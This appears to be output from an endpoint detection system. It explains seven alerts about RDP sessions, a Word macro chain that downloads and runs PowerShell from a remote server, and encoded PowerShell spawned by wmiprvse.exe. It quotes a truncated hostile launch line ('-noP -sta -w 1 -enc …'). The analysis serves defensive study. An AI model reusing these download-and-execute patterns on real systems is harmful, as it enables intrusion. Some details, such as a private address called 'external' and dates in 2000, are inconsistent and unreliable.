explanation:
Attack: An unauthorized remote desktop connection was established using rdpclip.exe.
Why this event: The creation of rdpclip.exe by svchost.exe and a subsequent remote logon by sysadmin from an external IP indicates an unauthorized access attempt.
Chain: svchost.exe -> rdpclip.exe (new process)
Evidence: svchost.exe connected to 10.20.5.191:59619, 10.50.2.101:59619, 10.20.5.191:60787, 10.50.2.101:60787 at 13:46:46; rdpclip.exe started at 13:48:15; network logon by sysadmin (domain SYSTEMIA.COM) from 10.103.123.250 at 13:47:20.

Attack: A remote desktop session initiated a connection to an internal host using mstsc.exe.
Why this event: The activity is suspicious because the connection to 10.47.35.74:3389 is an outbound connection from mstsc.exe, which is unusual for this machine's baseline.
Chain: explorer.exe -> mstsc.exe -> mstsc.exe connected to 10.47.35.74:3389.
Evidence: mstsc.exe started at 13:54:16 as sysadmin (domain SYSTEMIACOM) and connected to 10.47.35.74:3389 at 13:54:36.

Attack: An initial execution of a PowerShell script downloaded from a remote server via a command prompt.
Why this event: The process chain shows Microsoft Word spawning a command prompt which then executes a PowerShell command to download and run an encoded script from an external web server.
Chain: outlook.exe -> winword.exe -> cmd.exe -> powershell.exe
Evidence: winword.exe started cmd.exe at 10:39:23; cmd.exe started powershell.exe at 10:39:40 with a command line downloading and executing a script from http://news.com:8000/default.ps1.

Attack: PowerShell was used to download and execute a script from a remote server.
Why this event: The process started with a command that downloaded content from a web address, which is suspicious activity.
Chain: cmd.exe -> powershell.exe (started with download command) -> powershell.exe (ran New-Object command) -> powershell.exe (connected to external IP) -> powershell.exe (started new encoded powershell instance).
Evidence: Outbound connection from powershell.exe to 132.197.158.98:8000 at 10:39:48; powershell.exe started with download command at 10:39:40; powershell.exe wrote temporary script files at 10:39:43 and 10:39:49.

Attack: An encoded PowerShell command was executed to download and run a script from a remote server.
Why this event: The process started with a command line containing an encoded script and connected to an external IP address, which is indicative of malicious activity.
Chain: cmd.exe -> powershell.exe (started by rsantilli) -> powershell.exe (ran subsequent commands)
Evidence: powershell.exe started with -enc flag and connected to 132.197.158.98:8000 at 10:39:48; the command line contained an encoded script.

Attack: An encoded PowerShell command was executed by wmiprvse.exe to retrieve cached group policy settings.
Why this event: The execution of a heavily encoded PowerShell command by wmiprvse.exe is suspicious as it suggests an attempt to access system configuration data.
Chain: wmiprvse.exe -> powershell.exe, where powershell.exe executed the encoded command.
Evidence: On 2000-03-14 14:44:54, powershell.exe was spawned by wmiprvse.exe with the command line containing an encoded script. Subsequently, powershell.exe started conhost.exe at 14:44:55.

Attack: An encoded PowerShell command was executed via conhost.exe to run a suspicious script.
Why this event: The execution of an encoded PowerShell command initiated by wmiprvse.exe suggests malicious activity rather than routine administration.
Chain: wmiprvse.exe -> powershell.exe -> conhost.exe. wmiprvse.exe started powershell.exe which then launched conhost.exe.
Evidence: On 2000-03-14 14:44:54, wmiprvse.exe started powershell.exe with the command line: C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgB… This process then spawned conhost.exe.
